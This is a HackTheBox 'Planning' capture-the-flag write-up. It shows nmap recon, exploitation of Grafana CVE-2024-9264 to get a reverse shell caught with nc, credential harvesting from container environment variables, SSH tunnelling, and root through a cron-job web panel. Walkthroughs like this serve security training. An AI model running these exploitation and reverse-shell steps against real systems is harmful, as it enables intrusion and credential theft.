# HTB - Planning

## Recon

### nmap

```jsx
nmap -sC -sV -Pn 10.10.11.68
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 23:21 EDT
Nmap scan report for 10.10.11.68
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.22 seconds

```

we have only two ports so we can start with the webpage for that we need to add the host name to the `/etc/hosts` 

using ffuf we found a subdomain called `grafana` and using the version of grafana `Grafana v11.0.0 (83b9528bce)` we found vulnerability **`CVE-2024-9264` related to grafana** 

## Reverse shell

using the credentials from hackthebox admin / 0D5oT70Fq13EvB5r and the script from 

[https://github.com/nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)

```jsx
┌──(env)─(cyberghost㉿vbox)-[~/htb/planning/CVE-2024-9264]
└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash rev.sh" http://grafana.planning.htb/
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash rev.sh
⠼ Running duckdb query

```

```jsx
──(cyberghost㉿vbox)-[~/htb/planning]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.17] from (UNKNOWN) [10.10.11.68] 32896
sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)

```

we obtained a reverse shell , but this shell is a container upon inspecting the env variables using `printenv` we found the username `enzo` and password `RioTecRANDEntANT!`

```jsx
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=id
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana

```

using the the credentials we successfully logged into the ssh session of the user 

## prevesc

using linpeas we found a db file which contained credentials for a web page which was running in internal host port 8000

```jsx
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                  
══╣ Active Ports (netstat)                                                                                                    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                             
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40951         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -    
```

```jsx
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data                                                             
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-valid-for 6
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5

```

using ssh tunneling we port forward port 8000 to our localhost 8000 

```jsx
ssh -L 8000:localhost:8000 enzo@planning.htb
enzo@planning.htb's password: 
```

then we access the webpage in our browser which was running cronjobs as root so using that we gained reverse shell as root

![Screenshot_2025-07-03_01_50_51.png](planning/Screenshot_2025-07-03_01_50_51.png)

![Screenshot_2025-07-03_01_54_10.png](planning/Screenshot_2025-07-03_01_54_10.png)